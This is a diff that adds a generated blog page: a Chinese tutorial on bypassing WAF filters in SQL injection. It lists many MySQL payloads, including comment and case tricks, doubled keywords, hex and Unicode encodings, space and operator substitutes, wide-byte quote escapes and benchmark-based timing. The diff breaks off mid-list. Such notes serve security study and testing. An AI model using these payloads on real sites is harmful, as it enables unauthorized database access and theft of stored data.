@@ -1,71 +1,978 @@
-extends widget/base
-block append head
-  link(rel='stylesheet', href= url_for('/style/post.css'))
-  link(rel='stylesheet', href= url_for('/style/themes/highlight-theme-light.css'))
-  link(rel='stylesheet', href= url_for('/style/common/jquery.fancybox.min.css'))
-  script(src= url_for("/js/highlight.pack.js"))
-  meta(name="description", content=truncate( strip_html(page.content), {length: 360, omission: '..'} ))
-  if theme.comment_valine && theme.comment_valine.enable
-      script(src="//unpkg.com/valine/dist/Valine.min.js")
-block topic
-    div#postTopic.is-full-height
-        - var title = truncate( page.title, {length: 65, omission: '..'} ) || ''
-        p.is-full-height.is-flex-shrink-0.is-flex.is-align-items-center.is-justify-content-center= title
-        p.is-full-height.is-flex-shrink-0.is-flex.is-align-items-center.is-justify-content-center= __('click_back_to_the_top')
 
-block content
-    - var tocContent = toc(page.content, {list_number: false})
-    main.container.is-max-widescreen.content.section.post-page.pt-4.px-4
-        .columns.is-flex-desktop.is-justify-content-center.is-flex-direction-row-reverse
-            .column.is-3.is-hidden-mobile(class= tocContent.length < 1 && 'is-hidden')!= tocContent
-            .column.is-9
-                header.my-4
-                    if page.tags && page.tags.length > 0
-                        each tag in page.tags.toArray()
-                            a(href= url_for(`/tags/${tag.name}`))
-                                i.tag.post-item-tag= tag.name
-                h1.mt-0.mb-1.is-family-serif#postTitle= page.title
-                if page.date
-                    time.has-text-grey(datetime=page.date.toJSON())= date(page.date, date_format)
-                article.mt-2.post-content!= page.content
-                section.jump-container.is-flex.is-justify-content-space-between.my-6
-                    // em is empty placeholder
-                    if page.prev
-                        - var preContent= `${ __('prev') }: ${ page.prev.title }`
-                        a.button.is-default(href= url_for(page.prev.path) title= page.prev.title)
-                            i.iconfont.icon-prev.mr-2.has-text-grey
-                            span.has-text-weight-semibold= preContent
-                    else
-                        em
-                    if page.next
-                        - var nextContent= `${ __('next') }: ${ page.next.title }`
-                        a.button.is-default(href= url_for(page.next.path) title= page.next.title)
-                            span.has-text-weight-semibold= nextContent
-                            i.iconfont.icon-next.ml-2.has-text-grey
-                if theme.comment_utteranc && theme.comment_utteranc.enable
-                    article.mt-6.comment-container
-                        script(
-                            async
-                            repo= theme.comment_utteranc.repo
-                            src= "https://utteranc.es/client.js"
-                            label= theme.comment_utteranc.label
-                            issue-term= theme.comment_utteranc.issue_term || "pathname"
-                            theme= theme.comment_utteranc.theme || "preferred-color-scheme"
-                        )
-                if theme.comment_valine && theme.comment_valine.enable
-                    article.mt-6.comment-container#vcomments(
-                        data-comment_valine_id= theme.comment_valine.appId
-                        data-comment_valine_key= theme.comment_valine.appKey
-                    )
-                if theme.comment_disqus && theme.comment_disqus.enable
-                    div#disqus_thread
-                    article.mt-6.comment-container#disqus
-                        script="var disqus_config = function () {this.page.url = '"+theme.comment_disqus.url+url_for(page.path)+"';this.page.identifier = '"+theme.comment_disqus.name+"';};"
-                        script="(function() {var d = document, s = d.createElement('script');s.src = 'https://"+theme.comment_disqus.name+".disqus.com/embed.js';s.setAttribute('data-timestamp', +new Date());(d.head || d.body).appendChild(s);})();"
-                        script(id="dsq-count-scr", src="//blog-pubgj2togw.disqus.com/count.js", async)
-block script
-    if theme.image_zoom && theme.image_zoom.enable
-        script(src= url_for("/js/jquery-3.6.1.min.js"))
-        script(src= url_for("/js/jquery-fancybox.min.js"))
-        script(src= url_for("/js/img_zoom.js"))
-    script(src= url_for("/js/post.js"))
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G582PR7P29"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-G582PR7P29');
+</script>
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="kivvs">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1.注释符绕过常用的注释符有： 1）– 注释内容 2）# 注释内容 3）&#x2F;注释内容&#x2F; eg： 123union select 1,2#union select 1,2 --+  构造闭合  1’ union select 1,2’ 2.大小写绕过常用于 waf的正则对大小写不敏感的情况。 uniOn selEct 1,2 3.内联注释绕过内联注释就是把一些特有的仅在MYSQL上">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入绕过姿势">
+<meta property="og:url" content="https://kivvs.github.io/2026/08/14/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/index.html">
+<meta property="og:site_name" content="kivvs">
+<meta property="og:description" content="1.注释符绕过常用的注释符有： 1）– 注释内容 2）# 注释内容 3）&#x2F;注释内容&#x2F; eg： 123union select 1,2#union select 1,2 --+  构造闭合  1’ union select 1,2’ 2.大小写绕过常用于 waf的正则对大小写不敏感的情况。 uniOn selEct 1,2 3.内联注释绕过内联注释就是把一些特有的仅在MYSQL上">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-14T14:56:13.000Z">
+<meta property="article:modified_time" content="2026-08-14T14:57:16.355Z">
+<meta property="article:author" content="kivvs">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>sql注入绕过姿势 - kivvs</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"kivvs.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"gtag":"G-G582PR7P29"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>kivvs</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sql注入绕过姿势"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-08-14 22:56" pubdate>
+          2026年8月14日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          51 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">sql注入绕过姿势</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="1-注释符绕过"><a href="#1-注释符绕过" class="headerlink" title="1.注释符绕过"></a>1.注释符绕过</h2><p>常用的注释符有：</p>
+<p>1）– 注释内容</p>
+<p>2）# 注释内容</p>
+<p>3）&#x2F;<em>注释内容</em>&#x2F;</p>
+<p>eg：</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-meta">#</span><br><br><span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> --+<br></code></pre></td></tr></table></figure>
+
+<p>构造闭合 </p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">’ <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>’<br></code></pre></td></tr></table></figure>
+<h2 id="2-大小写绕过"><a href="#2-大小写绕过" class="headerlink" title="2.大小写绕过"></a>2.大小写绕过</h2><p>常用于 waf的正则对大小写不敏感的情况。</p>
+<p><code>uniOn selEct 1,2</code></p>
+<h2 id="3-内联注释绕过"><a href="#3-内联注释绕过" class="headerlink" title="3.内联注释绕过"></a>3.内联注释绕过</h2><p>内联注释就是把一些特有的仅在MYSQL上的语句放在 &#x2F;<em>!…</em>&#x2F; 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。别和注释&#x2F;*… *&#x2F;搞混了。</p>
+<p>eg：<code>union /*!select*/ 1,2</code></p>
+<h2 id="4-双写关键字绕过"><a href="#4-双写关键字绕过" class="headerlink" title="4.双写关键字绕过"></a>4.双写关键字绕过</h2><p>一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。</p>
+<p>eg：<code>union seselectlect 1,2</code></p>
+<h2 id="5-特殊编码绕过"><a href="#5-特殊编码绕过" class="headerlink" title="5.特殊编码绕过"></a>5.特殊编码绕过</h2><h3 id="1）十六进制绕过"><a href="#1）十六进制绕过" class="headerlink" title="1）十六进制绕过"></a>1）十六进制绕过</h3><p>eg：<code>UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B</code></p>
+<h3 id="2）ascii编码绕过"><a href="#2）ascii编码绕过" class="headerlink" title="2）ascii编码绕过"></a>2）ascii编码绕过</h3><p>eg：<code>Test =CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code></p>
+<h3 id="3）Unicode编码"><a href="#3）Unicode编码" class="headerlink" title="3）Unicode编码"></a>3）Unicode编码</h3><p>常用的几个符号的一些Unicode编码：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm">单引号: <span class="hljs-variable">%u0027</span>、<span class="hljs-variable">%u02b9</span>、<span class="hljs-variable">%u02bc</span>、<span class="hljs-variable">%u02c8</span>、<span class="hljs-variable">%u2032</span>、<span class="hljs-variable">%uff07</span>、<span class="hljs-variable">%c0</span><span class="hljs-variable">%27</span>、<span class="hljs-variable">%c0</span><span class="hljs-variable">%a7</span>、<span class="hljs-variable">%e0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%a7</span><br><br>空格：<span class="hljs-variable">%u0020</span>、<span class="hljs-variable">%uff00</span>、<span class="hljs-variable">%c0</span><span class="hljs-variable">%20</span>、<span class="hljs-variable">%c0</span><span class="hljs-variable">%a0</span>、<span class="hljs-variable">%e0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%a0</span><br><br>左括号：<span class="hljs-variable">%u0028</span>、<span class="hljs-variable">%uff08</span>、<span class="hljs-variable">%c0</span><span class="hljs-variable">%28</span>、<span class="hljs-variable">%c0</span><span class="hljs-variable">%a8</span>、<span class="hljs-variable">%e0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%a8</span><br><br>右括号：<span class="hljs-variable">%u0029</span>、<span class="hljs-variable">%uff09</span>、<span class="hljs-variable">%c0</span><span class="hljs-variable">%29</span>、<span class="hljs-variable">%c0</span><span class="hljs-variable">%a9</span>、<span class="hljs-variable">%e0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%a9</span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="6-空格过滤绕过"><a href="#6-空格过滤绕过" class="headerlink" title="6.空格过滤绕过"></a>6.空格过滤绕过</h2><p>可代替空格的方式：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>）/**/<br><br><span class="hljs-number">2</span>）<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br><br><span class="hljs-number">3</span>）回车<span class="hljs-punctuation">(</span>url编码中的%<span class="hljs-number">0</span><span class="hljs-keyword">a</span><span class="hljs-punctuation">)</span><br><br><span class="hljs-number">4</span>）<span class="hljs-punctuation">(</span>tap键上面的按钮<span class="hljs-punctuation">)</span><br><br><span class="hljs-number">5</span>）tap<br><br><span class="hljs-number">6</span>）两个空格<br></code></pre></td></tr></table></figure>
+<p>eg：<code>union/**/select/**/1,2</code></p>
+<p><code>select(passwd)from(users)  #注意括号中不能含有*</code></p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> passwd <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="7-过滤or-and-xor-异或-not-绕过"><a href="#7-过滤or-and-xor-异或-not-绕过" class="headerlink" title="7.过滤or and xor(异或) not 绕过"></a>7.过滤or and xor(异或) not 绕过</h2><figure class="highlight freedesktop"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs freedesktop"><span class="hljs-attr">and</span> <span class="hljs-operator">=</span> &amp;&amp;<br><br><span class="hljs-attr">or</span> <span class="hljs-operator">=</span> ||<br><br><span class="hljs-attr">xor</span> <span class="hljs-operator">=</span> |<br><br><span class="hljs-attr">not</span> <span class="hljs-operator">=</span> !<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="8-过滤等号-绕过"><a href="#8-过滤等号-绕过" class="headerlink" title="8.过滤等号&#x3D;绕过"></a>8.过滤等号&#x3D;绕过</h2><h3 id="1）不加通配符的like执行的效果和-一致，所以可以用来绕过。"><a href="#1）不加通配符的like执行的效果和-一致，所以可以用来绕过。" class="headerlink" title="1）不加通配符的like执行的效果和&#x3D;一致，所以可以用来绕过。"></a>1）不加通配符的like执行的效果和&#x3D;一致，所以可以用来绕过。</h3><p>eg：<code>UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name like &quot;users&quot;</code></p>
+<h3 id="2）rlike-模糊匹配，只要字段的值中存在要查找的-部分-就会被选择出来，用来取代-时，rlike的用法和上面的like一样，没有通配符效果和-一样"><a href="#2）rlike-模糊匹配，只要字段的值中存在要查找的-部分-就会被选择出来，用来取代-时，rlike的用法和上面的like一样，没有通配符效果和-一样" class="headerlink" title="2）rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来，用来取代&#x3D;时，rlike的用法和上面的like一样，没有通配符效果和&#x3D;一样"></a>2）rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来，用来取代&#x3D;时，rlike的用法和上面的like一样，没有通配符效果和&#x3D;一样</h3><p>eg：<code>UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name rlike &quot;users&quot; </code></p>
+<h3 id="3）regexp-MySQL中使用-REGEXP-操作符来进行正则表达式匹配"><a href="#3）regexp-MySQL中使用-REGEXP-操作符来进行正则表达式匹配" class="headerlink" title="3）regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配"></a>3）regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</h3><p>eg：<code>UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name regexp &quot;users&quot;</code></p>
+<h3 id="4）使用大小于号来绕过"><a href="#4）使用大小于号来绕过" class="headerlink" title="4）使用大小于号来绕过"></a>4）使用大小于号来绕过</h3><p>eg：<code>select * from users where id &gt; 1 and id &lt; 3</code></p>
+<h3 id="5）-等价于-，所以在前面再加一个-结果就是等号了"><a href="#5）-等价于-，所以在前面再加一个-结果就是等号了" class="headerlink" title="5）&lt;&gt; 等价于 !&#x3D;，所以在前面再加一个!结果就是等号了"></a>5）&lt;&gt; 等价于 !&#x3D;，所以在前面再加一个!结果就是等号了</h3><p>eg：<code>select * from users where !(id &lt;&gt; 1)</code></p>
+<h2 id="9-过滤大小于号绕过"><a href="#9-过滤大小于号绕过" class="headerlink" title="9.过滤大小于号绕过"></a>9.过滤大小于号绕过</h2><p>在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。</p>
+<h3 id="1）greatest-n1-n2-n3…-返回n中的最大值"><a href="#1）greatest-n1-n2-n3…-返回n中的最大值" class="headerlink" title="1）greatest(n1, n2, n3…):返回n中的最大值"></a>1）greatest(n1, n2, n3…):返回n中的最大值</h3><p>eg：<code>select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116</code></p>
+<h3 id="2）least-n1-n2-n3…-返回n中的最小值，与上同理。"><a href="#2）least-n1-n2-n3…-返回n中的最小值，与上同理。" class="headerlink" title="2）least(n1,n2,n3…):返回n中的最小值，与上同理。"></a>2）least(n1,n2,n3…):返回n中的最小值，与上同理。</h3><h3 id="3）strcmp-str1-str2-若所有的字符串均相同，则返回0，若根据当前分类次序，第一个参数小于第二个，则返回-1，其它情况返回-1"><a href="#3）strcmp-str1-str2-若所有的字符串均相同，则返回0，若根据当前分类次序，第一个参数小于第二个，则返回-1，其它情况返回-1" class="headerlink" title="3）strcmp(str1,str2):若所有的字符串均相同，则返回0，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1"></a>3）strcmp(str1,str2):若所有的字符串均相同，则返回0，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</h3><p>eg：<code>select * from users where id = 1 and strcmp(ascii(substr(username,1,1)),117)</code></p>
+<h3 id="4）in关键字"><a href="#4）in关键字" class="headerlink" title="4）in关键字"></a>4）in关键字</h3><p>eg：<code>select * from users where id = 1 and substr(username,1,1) in (&#39;t&#39;)</code></p>
+<h3 id="5）between-a-and-b-范围在a-b之间，包括a、b。"><a href="#5）between-a-and-b-范围在a-b之间，包括a、b。" class="headerlink" title="5）between a and b:范围在a-b之间，包括a、b。"></a>5）between a and b:范围在a-b之间，包括a、b。</h3><p>eg：<code>select * from users where id between 1 and 2</code></p>
+<p><code>select * from users where id between 1 and 1</code></p>
+<h2 id="10过滤引号绕过"><a href="#10过滤引号绕过" class="headerlink" title="10过滤引号绕过"></a>10过滤引号绕过</h2><h3 id="1）使用十六进制"><a href="#1）使用十六进制" class="headerlink" title="1）使用十六进制"></a>1）使用十六进制</h3><p>eg：<code>UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B</code></p>
+<h3 id="2）宽字节，常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节。-27表示-‘-单引号-，单引号会被转义成"><a href="#2）宽字节，常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节。-27表示-‘-单引号-，单引号会被转义成" class="headerlink" title="2）宽字节，常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节。%27表示 ‘(单引号)，单引号会被转义成&#39;"></a>2）宽字节，常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节。%27表示 ‘(单引号)，单引号会被转义成&#39;</h3><p>eg：<code>%E6 union select 1,2 #</code></p>
+<p><code>%df%27 union select  1,2,3  #</code></p>
+<h2 id="11-过滤逗号绕过"><a href="#11-过滤逗号绕过" class="headerlink" title="11.过滤逗号绕过"></a>11.过滤逗号绕过</h2><h3 id="1）如果waf过滤了逗号，并且只能盲注，在取子串的几个函数中，有一个替代逗号的方法就是使用from-pos-for-len，其中pos代表从pos个开始读取len长度的子串"><a href="#1）如果waf过滤了逗号，并且只能盲注，在取子串的几个函数中，有一个替代逗号的方法就是使用from-pos-for-len，其中pos代表从pos个开始读取len长度的子串" class="headerlink" title="1）如果waf过滤了逗号，并且只能盲注，在取子串的几个函数中，有一个替代逗号的方法就是使用from pos for len，其中pos代表从pos个开始读取len长度的子串"></a>1）如果waf过滤了逗号，并且只能盲注，在取子串的几个函数中，有一个替代逗号的方法就是使用from pos for len，其中pos代表从pos个开始读取len长度的子串</h3><p>eg：常规写法 <code>select substr(&quot;string&quot;,1,3)</code></p>
+<p>若过滤了逗号，可以使用from pos for len来取代 select substr(“string” from 1 for 3)</p>
+<p>sql盲注中 <code>select ascii(substr(database() from 1 for 1)) &gt; 110</code></p>
+<h3 id="2）也可使用join关键字来绕过"><a href="#2）也可使用join关键字来绕过" class="headerlink" title="2）也可使用join关键字来绕过"></a>2）也可使用join关键字来绕过</h3><p>eg：<code>select * from users union select * from (select 1)a join (select 2)b join(select 3)c</code></p>
+<p>上式等价于 union select 1,2,3</p>
+<h3 id="3）使用like关键字，适用于substr-等提取子串的函数中的逗号"><a href="#3）使用like关键字，适用于substr-等提取子串的函数中的逗号" class="headerlink" title="3）使用like关键字，适用于substr()等提取子串的函数中的逗号"></a>3）使用like关键字，适用于substr()等提取子串的函数中的逗号</h3><p>eg：<code>select user() like &quot;t%&quot;</code></p>
+<p>上式等价于 <code>select ascii(substr(user(),1,1))=114</code></p>
+<h3 id="5）使用offset关键字，适用于limit中的逗号被过滤的情况，limit-2-1等价于limit-1-offset-2"><a href="#5）使用offset关键字，适用于limit中的逗号被过滤的情况，limit-2-1等价于limit-1-offset-2" class="headerlink" title="5）使用offset关键字，适用于limit中的逗号被过滤的情况，limit 2,1等价于limit 1 offset 2"></a>5）使用offset关键字，适用于limit中的逗号被过滤的情况，limit 2,1等价于limit 1 offset 2</h3><p>eg：<code>select * from users limit 1 offset 2</code></p>
+<p>上式等价于 <code>select * from users limit 2,1</code></p>
+<h2 id="12-过滤函数绕过"><a href="#12-过滤函数绕过" class="headerlink" title="12.过滤函数绕过"></a>12.过滤函数绕过</h2><h3 id="1）sleep-–-benchmark"><a href="#1）sleep-–-benchmark" class="headerlink" title="1）sleep() –&gt;benchmark()"></a>1）sleep() –&gt;benchmark()</h3><p>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式</p>
+<p>eg：<code>select 1,2 and benchmark(1000000000,1)</code></p>
